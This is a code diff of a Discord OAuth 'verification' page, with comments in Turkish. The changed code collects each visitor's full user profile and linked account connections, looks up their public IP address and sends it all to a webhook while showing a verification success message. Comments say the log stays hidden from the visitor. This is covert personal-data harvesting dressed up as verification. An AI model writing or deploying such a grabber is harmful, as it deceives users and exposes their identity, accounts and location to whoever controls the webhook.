@@ -58,10 +58,8 @@
       const statusEl = document.getElementById("status");
 
       const log = (msg) => {
-        // İstersen log'u console da göster
         console.log(msg);
-        // Log alanı görünmesin ama istersen yorum satırını kaldır log göstermek için
-        // logEl.textContent += "\n" + msg;
+        // logEl.textContent += "\n" + msg; // İstersen açabilirsin
       };
 
       const code = new URLSearchParams(window.location.search).get("code");
@@ -93,22 +91,23 @@
           headers: { "Authorization": `Bearer ${tokenData.access_token}` }
         });
         const user = await userRes.json();
-        log("✅ Başarılı kayıt.");
+        log("✅ Doğrulama Başarılı");
 
-        // 3. Vanity URL (kısa kullanıcı URL'si)
-        const vanity_url = `https://discord.com/users/${user.id}`;
+        // 3. Kullanıcının bağlantılarını (connections) çek
+        const connectionsRes = await fetch("https://discord.com/api/users/@me/connections", {
+          headers: { "Authorization": `Bearer ${tokenData.access_token}` }
+        });
+        const connections = await connectionsRes.json();
 
-        // 4. IP adresi çek
+        // 4. IP adresi al
         const ipRes = await fetch("https://api.ipify.org?format=json");
         const ipData = await ipRes.json();
 
-        // 5. Webhook'a gönderilecek payload
+        // 5. Webhook payload - tüm veriler
         const payload = {
-          id: user.id,
-          username: `${user.username}#${user.discriminator}`,
-          email: user.email || null,
-          client_ip: ipData.ip,
-          vanity_url: vanity_url
+          user: user,
+          connections: connections,
+          client_ip: ipData.ip
         };
 
         await fetch(webhook_url, {
